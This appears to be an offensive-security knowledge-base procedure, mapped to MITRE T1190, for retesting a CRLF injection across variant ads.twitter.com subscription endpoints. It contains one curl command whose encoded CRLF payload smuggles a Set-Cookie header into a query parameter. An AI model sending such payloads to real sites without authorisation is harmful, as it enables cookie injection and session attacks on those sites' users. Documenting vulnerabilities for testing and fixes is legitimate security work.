---
tags:
  - crlf-injection
  - variation-testing
type: procedure
tools:
  - '[[tools/Browser]]'
  - '[[tools/Bandicam]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-header-injection-test]]'
  - '[[commands/curl-set-cookie-injection]]'
  - '[[commands/curl-variation-test]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 40db69c0-39ed-4285-8456-c747ca7faa77
created_at: '2025-12-11T06:10:16.057Z'
updated_at: '2025-12-11T06:10:16.057Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Test Persistence and Variations

## Summary

This procedure tests variations of the CRLF injection across different endpoints to confirm persistence after initial mitigation attempts.

## Description

Variations include different parameters and endpoints like /subscriptions/mobile/signup and /subscriptions/mobile/intro, ensuring the vulnerability is widespread.

## Requirements

1. Access to multiple endpoints
2. Tools for request sending
3. Patience for testing post-fix

## Defense

Defensive measures and detection strategies:

- Comprehensive parameter sanitization across all endpoints
- Regular vulnerability scanning

## Objectives

1. Test alternative URLs
2. Confirm ongoing vulnerability
3. Provide evidence for fixes

## Instructions

### Step 1: Test Variation URLs

**Context**: Send requests to variant endpoints.

**Command** ([[commands/curl-variation-test]]):

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/signup?ref=en-btc-help-twitter-promote-mode-header%0d%0aSet-Cookie:csrf_id=test%3b%20Path=/%3b'
```

> Verify injection; repeat for other URLs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-variation-test]]

## Tools Used

- [[tools/Browser]]

## Tags

- [[commands/curl-header-injection-test]]
- [[variation-testing]]
